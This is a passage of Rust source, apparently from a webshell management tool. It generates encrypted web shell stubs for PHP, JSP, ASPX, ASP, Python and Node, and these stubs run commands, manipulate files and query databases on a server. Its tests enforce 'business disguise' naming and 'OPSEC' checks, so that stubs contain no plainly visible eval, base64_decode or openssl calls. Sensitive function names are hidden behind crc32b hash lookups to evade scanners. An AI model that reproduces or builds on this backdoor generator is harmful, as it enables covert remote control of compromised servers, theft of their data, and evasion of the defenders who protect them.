                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"
                            ),
                            format!(
                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"
                            ),
                            vec![("ae4975ad", 16), ("62f98eda", 17)],
                        )
                    }
                    "des" => {
                        let ck = alpha_ident();
                        let cipher = xor_hex("DES-ECB", &ck);
                        let key = xor_hex(&md5_hex(password)[..8], &xk);
                        (
                            format!(
                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
                            ),
                            format!(
                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
                            ),
                            vec![("ae4975ad", 16), ("62f98eda", 17)],
                        )
                    }
                    "chacha20" => {
                        let key_enc = xor_hex(&md5_hex(password), &xk);
                        (
                            format!(
                                "$nonce=substr($in,0,12);$raw={{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,0,substr($in,12));"
                            ),
                            // 响应必须用**全新随机 nonce**：复用请求 nonce 时，
                            // 响应从 counter=1 起用同一密钥流，而请求已经用掉了
                            // 第 1 块之后的部分（载荷 > 64 字节时必然重叠）→
                            // 两段密文异或即两段明文异或，会泄漏命令/文件内容。
                            format!(
                                "$nonce=substr(md5(uniqid('',true),true),0,12);$enc=base64_encode($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
                            ),
                            vec![],
                        )
                    }
                    "rabbit" => {
                        let key_hex = md5_bytes(password)
                            .iter()
                            .map(|b| format!("{b:02x}"))
                            .collect::<String>();
                        let key_enc = xor_hex(&key_hex, &xk);
                        (
                            format!(
                                "$iv=substr($in,0,8);$raw={{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,0,substr($in,8));"
                            ),
                            // 同上：Rabbit 跳过 64 字节后与请求（前 ≥64 字节）重叠
                            format!(
                                "$iv=substr(md5(uniqid('',true),true),0,8);$enc=base64_encode($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
                            ),
                            vec![],
                        )
                    }
                    _ => (
                        "$raw=__XOR__($in,$K);".to_string(),
                        "$enc=base64_encode(__XOR__($out,$K));".to_string(),
                        vec![],
                    ),
                };
                let mut symbols = vec![
                    ("920cfbfd", 0),
                    ("9ff5d542", 1),
                    ("237937f6", 2),
                    ("2693a743", 3),
                    ("f0e567fb", 4),
                    ("f4cd15f3", 5),
                    ("f6cfd9d8", 6),
                    ("95e8b309", 7),
                    ("3d891bcd", 8),
                    ("dbc7b210", 9),
                    ("c996c86e", 10),
                    ("d99d544e", 11),
                    ("0e4d97e1", 12),
                    ("718c6ebe", 13),
                    ("4a41c8d9", 14),
                    ("c3427e9c", 15),
                ];
                symbols.extend(extra_symbols);
                let mut table = String::new();
                for (hash, index) in symbols {
                    table.push_str(&format!("    '{hash}' => {index},\n"));
                }
                let algo = match self.crypto {
                    "chacha20" => chacha20_php_algo(&prefix),
                    "rabbit" => rabbit_php_algo(&prefix),
                    _ => String::new(),
                };
                Ok(tpl
                    .replace("__SYMBOLS__", &table)
                    .replace("__ALGO__", &algo)
                    .replace("__DECRYPT__", &decrypt_expr)
                    .replace("__ENCRYPT__", &encrypt_expr)
                    // 注入的解密/加密表达式中的函数引用随前缀替换
                    .replace("{prefix}", &prefix)
                    .replace("__XOR__", &format!("{prefix}xor"))
                    .replace("__DEC__", &format!("{prefix}dec")))
            }
            "jsp" => {
                // JSP stub：XOR 载荷 + md5 哈希分发 + 命令/文件（无第三方依赖，手动 JSON）
                let xk = php_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                let h = |op: &str| -> String {
                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
                    let mut n: u64 = 0;
                    for (i, c) in digest.chars().take(8).enumerate() {
                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
                    }
                    n.to_string()
                };
                Ok(jsp_stub(
                    &xk,
                    // JSP 是 servlet API：getHeader 使用**报文头原名**，
                    // 而非 CGI 变量名（HTTP 前缀 + 下划线形式），否则恒为 null → 404
                    &xor_hex("X-Debug-Key", &xk),
                    &xor_hex(token, &xk),
                    &xor_hex(&key_hex, &xk),
                    // Java 的 int 只有 32 位：超过 i32::MAX 的常量必须带 L 后缀
                    &format!("{}L", h("probe")),
                    &format!("{}L", h("exec")),
                    &format!("{}L", h("list")),
                    &format!("{}L", h("read")),
                    &format!("{}L", h("write")),
                    &format!("{}L", h("delete")),
                    &format!("{}L", h("rename")),
                    &format!("{}L", h("mkdir")),
                    &format!("{}L", h("dbprobe")),
                    &format!("{}L", h("dbquery")),
                ))
            }
            "aspx" => {
                let xk = php_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                let h = |op: &str| -> String {
                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
                    let mut n: u64 = 0;
                    for (i, c) in digest.chars().take(8).enumerate() {
                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
                    }
                    n.to_string()
                };
                Ok(aspx_stub(
                    &xk,
                    // ASP.NET 的 Request.Headers 以**报文头原名**为键（CGI 形式由
                    // stub 内部兜底查询），与 JSP 同因
                    &xor_hex("X-Debug-Key", &xk),
                    &xor_hex(token, &xk),
                    &xor_hex(&key_hex, &xk),
                    &h("probe"),
                    &h("exec"),
                    &h("list"),
                    &h("read"),
                    &h("write"),
                    &h("delete"),
                    &h("rename"),
                    &h("mkdir"),
                ))
            }
            "asp" => {
                let xk = php_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                Ok(asp_stub(
                    &xk,
                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
                    &xor_hex(token, &xk),
                    &xor_hex(&key_hex, &xk),
                ))
            }
            "python" => {
                let xk = php_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                let h = |op: &str| -> String {
                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
                    let mut n: u64 = 0;
                    for (i, c) in digest.chars().take(8).enumerate() {
                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
                    }
                    n.to_string()
                };
                Ok(python_stub(
                    &xk,
                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
                    &xor_hex(token, &xk),
                    &xor_hex(&key_hex, &xk),
                    &h("probe"),
                    &h("exec"),
                    &h("list"),
                    &h("read"),
                    &h("write"),
                    &h("delete"),
                    &h("rename"),
                    &h("mkdir"),
                    &h("touch"),
                    &h("dbprobe"),
                    &h("dbquery"),
                ))
            }
            "node" => {
                let xk = php_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                let h = |op: &str| -> String {
                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
                    let mut n: u64 = 0;
                    for (i, c) in digest.chars().take(8).enumerate() {
                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
                    }
                    n.to_string()
                };
                Ok(node_stub(
                    &xk,
                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
                    &xor_hex(token, &xk),
                    &xor_hex(&key_hex, &xk),
                    &h("probe"),
                    &h("exec"),
                    &h("list"),
                    &h("read"),
                    &h("write"),
                    &h("delete"),
                    &h("rename"),
                    &h("mkdir"),
                    &h("touch"),
                    &h("dbprobe"),
                    &h("dbquery"),
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

#[cfg(test)]
#[allow(clippy::items_after_test_module)] // stub 生成辅助与编码器同文件，测试模块居中组织
mod tests {
    use super::*;

    #[test]
    fn xor_round_trip() {
        let key = md5_hex("secret").into_bytes();
        let original = b"hello dosword";
        let xored = XorBase64Encoder::xor(original, &key);
        assert_eq!(XorBase64Encoder::xor(&xored, &key), original);
    }

    #[test]
    fn xor_base64_encode_decodes_with_php_stub_key() {
        let encoder = XorBase64Encoder;
        let password = "secret";
        let code = "@ini_set(\"display_errors\",\"0\");echo 'hello';";
        let payload = encoder.encode(code, password);

        // 模拟服务端 stub 逻辑：base64 解码 → XOR 还原
        let key = encoder.derive_key(password);
        let key_bytes = key.into_bytes();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored = XorBase64Encoder::xor(&decoded, &key_bytes);
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn base64_encoder_is_plain() {
        let encoder = Base64Encoder;
        let payload = encoder.encode("echo 1;", "whatever");
        assert_eq!(
            String::from_utf8(
                base64::engine::general_purpose::STANDARD
                    .decode(&payload)
                    .unwrap()
            )
            .unwrap(),
            "echo 1;"
        );
    }

    #[test]
    fn python_node_stub_generation() {
        let encoder = NativeEncoder { crypto: "xor" };
        let stub = encoder.stub("python", "secret").unwrap();
        assert!(
            stub.contains("#!/usr/bin/env python3"),
            "Python stub 应为 CGI 脚本"
        );
        assert!(stub.contains("formData"), "应支持 formData 参数");
        assert!(
            stub.contains("urllib.parse.parse_qs"),
            "应从请求体解析 formData"
        );
        assert!(stub.contains("subprocess.run"), "应支持命令执行");
        assert!(stub.contains("os.utime"), "应支持 touch");
        assert!(!stub.contains("{xk}"), "占位符应已替换");
        let node = encoder.stub("node", "secret").unwrap();
        assert!(node.contains("require('http')"), "Node stub 应为 HTTP 服务");
        assert!(node.contains("URLSearchParams"), "应解析 formData");
        assert!(node.contains("child_process"), "应支持命令执行");
        assert!(node.contains("utimesSync"), "应支持 touch");
        assert!(!node.contains("{xk}"), "占位符应已替换");
    }

    #[test]
    fn stub_generation_all_languages() {
        // XorBase64 / Base64 仅支持 php/asp/aspx/jsp（python/node 仅 native）
        for encoder in [
            &XorBase64Encoder as &dyn PayloadEncoder,
            &Base64Encoder as &dyn PayloadEncoder,
        ] {
            for language in ["php", "asp", "aspx", "jsp"] {
                let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                    panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                });
                assert!(!stub.is_empty());
            }
        }
        // native 支持全部 6 种语言（python/node 已覆盖）
        for language in STUB_LANGUAGES {
            let stub = NativeEncoder { crypto: "xor" }
                .stub(language, "secret")
                .unwrap_or_else(|error| panic!("native 生成 {language} stub 失败：{error}"));
            assert!(!stub.is_empty());
        }
    }

    #[test]
    fn xor_stub_is_business_disguised() {
        let stub = XorBase64Encoder.stub("php", "secret").unwrap();
        // 业务伪装：密钥由 token 运行时派生，无内嵌密钥/明文密码
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        assert!(!stub.contains(&md5_hex("secret")), "stub 不应内嵌派生密钥");
        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
        // 业务外观：函数/注释形如正常业务
        for biz in [
            "verify_token",
            "unpack_session",
            "run_rule",
            "invalid_token",
            "会话状态查询",
        ] {
            assert!(stub.contains(biz), "stub 应含业务元素 {biz}");
        }
    }

    #[test]
    fn unsupported_language_rejected() {
        let result = XorBase64Encoder.stub("python", "secret");
        assert!(result.is_err());
    }

    #[test]
    fn key_is_md5_hex() {
        assert_eq!(md5_hex("secret"), "5ebe2294ecd0e0f08eab7690d2a6ee69");
    }

    // --- 自加密编码器（AES / DES） ---

    #[test]
    fn des_round_trip() {
        let encoder = DesEcbEncoder;
        let code = "echo 'des';";
        let payload = encoder.encode(code, "secret");
        let restored = des_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD
                .decode(&payload)
                .unwrap(),
            &des_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
    #[test]
    fn php_stubs_have_no_plain_sensitive_tokens() {
        let encoders: Vec<&dyn PayloadEncoder> = vec![
            &Base64Encoder,
            &XorBase64Encoder,
            &DesEcbEncoder,
            &CharEncoder,
            &PhpObfuscateEncoder,
        ];
        for encoder in encoders {
            let stub = encoder.stub("php", "secret").expect("php stub 应生成");
            assert!(
                !stub.contains("eval(")
                    && !stub.contains("EvAl(")
                    && !stub.contains("eVaL(")
                    && !stub.contains("EVAL("),
                "{} stub 不应含任何连续 eval( 形式（大小写变体）",
                encoder.id()
            );
            assert!(
                !stub.contains("base64_decode("),
                "{} stub 不应含 base64_decode(",
                encoder.id()
            );
            assert!(
                !stub.contains("openssl_decrypt("),
                "{} stub 不应含 openssl_decrypt(",
                encoder.id()
            );
            assert!(
                !stub.contains("$_POST['x']"),
                "{} stub 不应含 $_POST['x']",
                encoder.id()
            );
            assert!(
                !stub.contains("base64_decode"),
                "{} stub 不应含 base64_decode（含任何片段）",
                encoder.id()
            );
            assert!(
                !stub.contains("openssl"),
                "{} stub 不应含 openssl（含任何片段）",
                encoder.id()
            );
            assert!(
                !stub.contains("DES-ECB") && !stub.contains("AES-128"),
                "{} stub 不应含明文 cipher 名",
                encoder.id()
            );
            assert!(
                stub.contains("crc32b") || encoder.body_mode(),
                "{} stub 应使用 crc32b 哈希查表（php_stream 除外）",
                encoder.id()
            );
            // 业务伪装：请求参数为业务语义（token/data）；
            // 自加密会话编码器（aes128_ecb/aes128_cbc）为会话形态，无表单参数
            if !encoder.body_mode() {
                let (p1, p2) = encoder.form_params();
                assert!(
                    stub.contains(&format!("$_POST['{p1}']")),
                    "{} stub 应使用业务参数 {p1}",
                    encoder.id()
                );
                assert!(
                    stub.contains(&format!("$_POST['{p2}']")),
                    "{} stub 应使用业务参数 {p2}",
                    encoder.id()
                );
            }
        }
    }

    // --- 混淆编码器（CHAR / OBFUSCATE） ---

    #[test]
    fn char_encode_and_decode() {
        let encoder = CharEncoder;
        let code = "@ini_set('x',1);";
        let payload = encoder.encode(code, "ignored");
        // OPSEC：eval 大小写混合，但 chr 数组结构保留
        assert!(!payload.contains("eval("), "载荷不应含小写 eval(");
        assert!(
            payload.contains("implode('',array_map('chr',array("),
            "载荷应保留 chr 数组结构"
        );
        assert_eq!(char_decode(&payload).unwrap(), code);
    }

    #[test]
    fn obfuscate_encode_and_decode() {
        let encoder = PhpObfuscateEncoder;
        let code = "@ini_set('x',1);echo 'obf';";
        let payload = encoder.encode(code, "ignored");
        assert!(!payload.contains("@ini_set"), "载荷不应含明文");
        assert_eq!(obfuscate_decode(&payload).unwrap(), code);
    }

    #[test]
    fn new_encoders_php_stub_only() {
        for encoder in [
            &DesEcbEncoder as &dyn PayloadEncoder,
            &CharEncoder as &dyn PayloadEncoder,
            &PhpObfuscateEncoder as &dyn PayloadEncoder,
        ] {
            assert!(
                encoder.stub("php", "secret").is_ok(),
                "{} php stub 应成功",
                encoder.id()
            );
            assert!(
                encoder.stub("aspx", "secret").is_err(),
                "{} aspx 应提示不支持",
                encoder.id()
            );
        }
    }

    /// 能力协商依赖 stub 上报 ProtoVersion/Capabilities/ShellType。
    /// PHP 早已上报；本测试防止非 PHP stub 回退。
    #[test]
    fn aead_stub_has_crypto_primitives_without_plaintext_password() {
        let stub = AeadEncoder.stub("php", "secret").unwrap();
        assert!(stub.contains("aes-256-gcm"), "应使用 AES-256-GCM");
        assert!(stub.contains("81c7194f"), "符号表应含 hash_hkdf 的 crc32b");
        assert!(stub.contains("ae4975ad"), "符号表应含 openssl_decrypt");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        assert!(!stub.contains("md5($token)"), "不应退回旧 XOR 模板");
        // 密钥派生只用 SHA256(password) 的十六进制形式
        let ikm = crate::aead::ikm_hex("secret");
        assert!(!stub.contains(&ikm), "IKM 应以 XOR 形式嵌入，不能明文");
    }

    #[test]
    fn all_language_stubs_report_capabilities() {
        let encoder = NativeEncoder { crypto: "xor" };
        for language in ["php", "jsp", "aspx", "asp", "python", "node"] {
            let stub = encoder
                .stub(language, "secret")
                .unwrap_or_else(|error| panic!("{language} stub 生成失败：{error}"));
            assert!(
                stub.contains("ProtoVersion"),
                "{language} stub 缺少 ProtoVersion"
            );
            assert!(
                stub.contains("Capabilities"),
                "{language} stub 缺少 Capabilities"
            );
            assert!(stub.contains("ShellType"), "{language} stub 缺少 ShellType");
        }
    }

    #[test]
    fn registry_lists_all_encoders() {
        let ids: Vec<String> = EncoderRegistry::builtin()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        assert_eq!(
            ids,
            vec![
                "base64",
                "char",
                "custom",
                "des",
                "native",
                "native_aead",
                "native_aes_cbc",
                "native_aes_ecb",
                "native_chacha20",
                "native_des",
                "native_rabbit",
                "php_obfuscate",
                "php_stream",
                "xor_base64",
                "xor_body",
                "xor_session",
            ],
            "注册表应暴露全部 16 个编码器（NATIVE 系列 + 经典形态 + 自定义）"
        );
        assert_eq!(ids.len(), 16, "编码器数量应与注册表一致");
    }

    // --- PHP_STREAM：零敏感函数 stub ---

    #[test]
    fn php_stream_stub_has_no_sensitive_functions() {
        let stub = PhpStreamEncoder.stub("php", "secret").unwrap();
        for token in [
            "eval",
            "assert",
            "base64_decode",
            "openssl_decrypt",
            "$_POST",
            "$_GET",
            "system",
            "exec(",
        ] {
            assert!(!stub.contains(token), "stub 不应含 {token}：{stub}");
        }
        assert!(stub.contains("php://input"), "stub 应基于 php://input");
        assert!(
            stub.contains("convert.base64-decode"),
            "stub 应使用 base64 流过滤器"
        );
    }

    #[test]
    fn xor_session_stub_and_handler() {
        let stub = XorSessionEncoder.stub("php", "secret").unwrap();
        // 敏感词检查（含 evAl 之外的）
        for token in ["eval(", "base64_decode", "openssl", "$_POST"] {
            assert!(!stub.contains(token), "stub 不应含 {token}");
        }
        // session 分阶段结构
        assert!(stub.contains("session_start"), "stub 应启用 session");
        assert!(stub.contains("DswSesInit"), "stub 应识别初始化标记");
        // OPSEC：请求体读取经符号表 + 字符串拆分（无连续 php://input / file_get_contents）
        assert!(!stub.contains("php://input"), "stub 不应含连续 php://input");
        assert!(
            !stub.contains("file_get_contents"),
            "stub 不应含 file_get_contents 明文"
        );
        assert!(
            stub.contains("2693a743"),
            "stub 符号表应含 file_get_contents 的 crc32b"
        );
        assert!(
            stub.contains("$ses = $_SESSION"),
            "stub 应经间接数组读取 session"
        );
        assert!(stub.contains("run_rule"), "eval 应经业务函数包裹");
        // 处理器：不含 PHP 开标签（eval 执行），含 run 函数与操作分支
        let handler = session_handler_code();
        assert!(!handler.contains("<?php"), "处理器不应含 PHP 开标签");
        assert!(handler.contains("function run"), "处理器应定义 run");
        for action in [
            "probe", "exec", "eval", "list", "read", "write", "delete", "rename", "mkdir", "touch",
            "dbprobe", "dbquery",
        ] {
            assert!(
                handler.contains(&format!("$a==='{action}'")),
                "处理器应含 {action} 分支"
            );
        }
        // 往返：encode -> stub 的 XOR 解密逻辑还原
        let code = "function run($p){}";
        let payload = XorSessionEncoder.encode(code, "secret");
        let key = md5_hex("secret").into_bytes();
        let raw = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored: Vec<u8> = raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn php_stream_body_mode_encode() {
        let encoder = PhpStreamEncoder;
        assert!(encoder.body_mode(), "php_stream 应为 body 模式");
        let code = "@ini_set('display_errors','0');echo 1;";
        let payload = encoder.encode(code, "ignored");
        // 载荷是完整源码的 base64（含 <?php 标签）
        let restored = php_stream_decode(&payload).unwrap();
        assert_eq!(restored, code);
    }

    // --- 跨语言 stub 结构断言（无需容器/运行时，防回归） ---

    /// 回归：生成的 JSP stub 必须是合法 Java。
    ///
    /// 历史缺陷：`DSW_mkdir` 缺少闭合花括号（后续方法被声明进方法体），
    /// 且 md5 前 8 字节常量（最大 4294967295）直接写成 Java int 字面量，
    /// > i32::MAX 的 6 个操作全部非法 → Jasper 编译失败，协议完全不可用。
    #[test]
    fn jsp_stub_is_valid_java_shape() {
        let stub = NativeEncoder { crypto: "xor" }
            .stub("jsp", "secret")
            .unwrap();

        // 1) 每个 static 方法必须在下一个方法声明前闭合
        let declarations = [
            "static String DSW_exec",
            "static String DSW_list",
            "static String DSW_read",
            "static String DSW_write",
            "static String DSW_del",
            "static String DSW_ren",
            "static String DSW_mkdir",
            "static String DSW_dbprobe",
            "static String DSW_dbquery",
            "static String DSW_json_get",
        ];
        for (index, declaration) in declarations.iter().enumerate() {
            let Some(start) = stub.find(declaration) else {
                panic!("JSP stub 缺少 {declaration}");
            };
            let next = declarations
                .get(index + 1)
                .and_then(|next_declaration| stub.find(next_declaration))
                .unwrap_or(stub.len());
            let body = &stub[start..next];
            let closes = body.matches('}').count();
            assert!(
                closes >= 1,
                "{declaration} 到下一个方法之间没有闭合花括号（方法体未闭合）"
            );
        }

        // 2) 哈希派发常量必须带 Java long 后缀
        let mut checked = 0;
        for (index, _) in stub.match_indices("h == ") {
            let rest = &stub[index + 5..];
            let digits: String = rest.chars().take_while(char::is_ascii_digit).collect();
            assert!(!digits.is_empty(), "h == 后应为十进制常量");
            let suffix = rest.chars().nth(digits.len());
            assert_eq!(
                suffix,
                Some('L'),
                "JSP 派发常量 {digits} 缺少 L 后缀（超过 i32::MAX 时不是合法 Java 字面量）"
            );
            checked += 1;
        }
        assert!(checked >= 10, "JSP 应包含全部派发分支，实际 {checked}");

        // 3) 请求头必须用 servlet 报文头原名（CGI 形式 getHeader 恒为 null）
        assert!(
            stub.contains("request.getHeader(DSW_dec("),
            "JSP 应通过解密后的头名读取请求头"
        );
        assert!(
            !stub.contains("HTTP_X_DEBUG_KEY"),
            "JSP 不应把 CGI 头名当作 servlet 头名"
        );
    }

    /// 回归：ASP stub 的两处运行期错误。
    #[test]
    fn asp_stub_declares_fso_and_handles_empty_output() {
        let stub = NativeEncoder { crypto: "xor" }
            .stub("asp", "secret")
            .unwrap();
        assert!(
            stub.contains("Dim sh, p, outv, bytes, m, t, fso"),
            "Option Explicit 下 DoExec 必须先声明 fso"
        );
        assert!(
            stub.contains("If Len(s) = 0 Then"),
            "StrToBytes 必须对空串短路（ReDim arr(-1) 会运行期报错）"
        );
        assert!(
            stub.contains(r#"Left(t, 1) <> "\""#),
            "相对路径判断必须使用反斜杠字面量"
        );
    }

    /// 回归：ASPX 头部鉴权需兼容 CGI 形式（不同宿主暴露的键名不同）。
    #[test]
    fn aspx_stub_accepts_wire_and_cgi_header_names() {
        let stub = NativeEncoder { crypto: "xor" }
            .stub("aspx", "secret")
            .unwrap();
        assert!(
            stub.contains("Request.Headers[gk]"),
            "ASPX 应以报文头原名为键"
        );
        assert!(
            stub.contains("ServerVariables"),
            "ASPX 应保留 CGI 形式的兜底查询"
        );
        assert!(!stub.contains("HTTP_X_DEBUG_KEY"), "ASPX 不应写死 CGI 头名");
    }

    /// 回归：流密码变体的响应必须使用**全新** IV/nonce。
    ///
    /// 复用请求 IV 时，响应从 counter=1 / skip=64 起用同一密钥流，而请求已经
    /// 用掉了那一部分（载荷 > 64 字节时必然重叠）→ 两段密文异或即两段明文异或，
    /// 可猜的请求明文足以还原命令输出与文件内容。
    #[test]
    fn stream_cipher_responses_use_fresh_iv() {
        for crypto in ["chacha20", "rabbit"] {
            let stub = NativeEncoder { crypto }.stub("php", "secret").unwrap();
            assert!(
                stub.contains("uniqid('',true)"),
                "{crypto} 响应应使用全新随机 IV/nonce"
            );
            assert!(
                !stub.contains("$nonce=substr($in,0,12);$enc")
                    && !stub.contains("$iv=substr($in,0,8);$enc"),
                "{crypto} 响应不得复用请求 IV/nonce"
            );
        }
    }

    /// 回归：分阶段处理器的**所有**返回路径都必须用 nonce 帧包裹，
    /// 否则客户端把 ServerError 误判为「响应中未找到协议帧」。
    ///
    /// 现设计把收尾收敛到函数末尾的单一 `return`：错误分支只写
    /// `$r['ok']=false` / `$r['error']`，帧包裹天然覆盖全部分支；
    /// 唯一的提前返回（请求 JSON 解析失败）自带帧。本测试守住这两点。
    #[test]
    fn session_handler_errors_are_nonce_framed() {
        let handler = session_handler_code();
        // 唯一提前返回必须带帧，且 $n 在它之前就已取好（否则帧里是空 nonce）
        assert_eq!(
            handler.matches(r#"'{"ok":false"#).count(),
            1,
            "只应有一处内联错误帧（提前返回）"
        );
        assert!(
            handler.contains(
                r#"return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;"#
            ),
            "请求解析失败的提前返回必须带 nonce 帧"
        );
        // 收尾帧包裹整个 $r
        assert!(
            handler.contains("return $n.(isset($__g[6])?@$__g[6]($__j):'').$n;"),
            "收尾必须帧包裹 $r"
        );
        for message in ["read failed", "write failed", "mkdir failed"] {
            assert!(
                handler.contains(&format!("$r['error']='{message}';")),
                "错误分支应写入 $r：{message}"
            );
        }
        // NATIVE stub 的同类字符串是**载荷**（外层统一加帧），不得被误改
        let native = NativeEncoder { crypto: "xor" }
            .stub("php", "secret")
            .unwrap();
        assert!(
            !native.contains("$n.base64_encode"),
            "NATIVE stub 不应出现帧形式的 $n 拼接"
        );
    }

    /// 通道对齐：分阶段处理器必须与 NATIVE stub 具备同一批能力
    /// （6 驱动数据库、命令函数降级链、单次 stat 的目录列举）。
    ///
    /// 历史缺陷：处理器只支持 mysql/pgsql/sqlite 三个驱动、命令硬用 `shell_exec`、
    /// 目录列举逐项 4 次系统调用 —— 同一个 Shell 换个编码器就少一半功能。
    #[test]
    fn session_handler_matches_native_capabilities() {
        let handler = session_handler_code();
        let native = NativeEncoder { crypto: "xor" }
            .stub("php", "secret")
            .unwrap();
        for marker in [
            "sqlsrv:Server=",
            "dblib:host=",
            "oci:dbname=",
            "SELECT name FROM sys.databases",
            "SELECT datname FROM pg_database",
            "SELECT username FROM all_users",
            "SHOW DATABASES",
            "chunked,stream,db,plugin,exec,gzip",
        ] {
            assert!(handler.contains(marker), "处理器缺少：{marker}");
            assert!(native.contains(marker), "NATIVE stub 缺少：{marker}");
        }
        // 命令降级链：两条通道都必须保留（NATIVE 用明文候选数组，处理器用整数索引）
        assert!(
            native.contains("'shell_exec','exec','system','passthru','popen'"),
            "NATIVE stub 应含命令函数降级候选"
        );
        assert!(
            handler.contains("foreach(array(0,1,2,3,4) as $__i)"),
            "处理器应按符号表索引探测命令函数"
        );
        // redis 走裸 RESP：NATIVE 经符号表调用，处理器用 dsw_rcmd
        assert!(handler.contains("dsw_rcmd"), "处理器应含 redis RESP 辅助");
        assert!(native.contains("AUTH"), "NATIVE stub 应含 redis AUTH");
        // 目录列举：单次 stat，不再逐项 is_dir/filesize/filemtime/fileperms
        assert!(
            handler.contains("$__s=@stat($__full);"),
            "处理器目录列举应合并 stat"
        );
        assert!(
            native.contains("$s=@stat($full);"),
            "NATIVE 目录列举应合并 stat"
        );
        assert!(
            !handler.contains("fileperms("),
            "处理器不应再逐项 fileperms"
        );
        assert!(
            !native.contains("fileperms("),
            "NATIVE stub 不应再逐项 fileperms"
        );
        // 命令函数全被禁用时给出明确错误，而不是静默空输出
        assert!(
            handler.contains("no exec function available"),
            "处理器应报告无可用的命令执行函数"
        );
        assert!(
            native.contains("no exec function available"),
            "NATIVE stub 应报告无可用的命令执行函数"
        );
    }

    /// 回归：业务伪装 stub / 请求体直传 stub 的 `$_g[0]` 是**调用方传入的第一个
    /// 符号**（base64_decode / openssl_decrypt），不得被「执行器降级」覆盖成命令函数。
    ///
    /// 两处模板曾各带一段降级代码覆盖 `$_g[0]`，于是解包时去调用
    /// `shell_exec(密文)` 并返回空，实测响应为 `{"code":200,"rule_size":0}`，
    /// 客户端报「响应中未找到协议帧」—— 8 个 legacy 编码器全部不可用。
    /// 命令函数降级链现在由发送的代码自行探测（`php_impl::PHP_EXEC_IMPL`）。
    #[test]
    fn legacy_stubs_do_not_clobber_symbol_slot_zero() {
        let mut checked = 0;
        for (id, _) in EncoderRegistry::global().list() {
            // custom 的 stub 由用户上传，本仓库不产出
            if id == "custom" {
                continue;
            }
            // NATIVE 系列模板的 $_g[0] 本来就是命令函数槽位（符号表里索引 0 = shell_exec）
            if id.starts_with("native") {
                continue;
            }
            let encoder = EncoderRegistry::global().get(&id).expect("编码器应已注册");
            for stub in [
                encoder.stub("php", "secret"),
                encoder.stub_session("php", "secret"),
            ]
            .into_iter()
            .flatten()
            {
                assert!(
                    !stub.contains("$_g[0]=") && !stub.contains("$_g[0] ="),
                    "{id} 的 stub 不得覆盖 $_g[0]（解包槽位）"
                );
                checked += 1;
            }
        }
        assert!(checked >= 14, "应检查到足够的 stub：{checked}");
    }

    /// OPSEC：分阶段处理器与共享实现片段里不应出现敏感函数名 ——
    /// 它们只以 crc32b 哈希出现在符号表里，运行时从 `get_defined_functions()` 反查。
    ///
    /// 与 NATIVE stub 同级（NATIVE 仍有明文候选数组与 `@eval($c)`，README 已诚实声明）；
    /// 本测试保证 session / legacy 通道**不比它差**，且新增代码不得把敏感名带回来。
    #[test]
    fn session_handler_and_shared_impl_have_no_plain_sensitive_names() {
        let handler = session_handler_code();
        let blobs: [(&str, &str); 6] = [
            ("handler", handler),
            ("exec", crate::php_impl::PHP_EXEC_IMPL),
            ("scan", crate::php_impl::PHP_SCAN_IMPL),
            ("dbprobe", crate::php_impl::PHP_DB_PROBE_IMPL),
            ("dbquery", crate::php_impl::PHP_DB_QUERY_IMPL),
            ("redis", crate::php_impl::PHP_REDIS_HELPERS),
        ];
        for (name, text) in blobs {
            for token in [
                "shell_exec",
                "passthru",
                "popen",
                "base64_decode",
                "base64_encode",
                "file_get_contents",
                "file_put_contents",
                "scandir",
                "unlink",
                "rmdir",
                "rename(",
                "stream_socket_client",
                "fwrite",
                "fgets",
                "fread",
                "preg_split",
                "gzdecode",
                "gzencode",
                "eval(",
            ] {
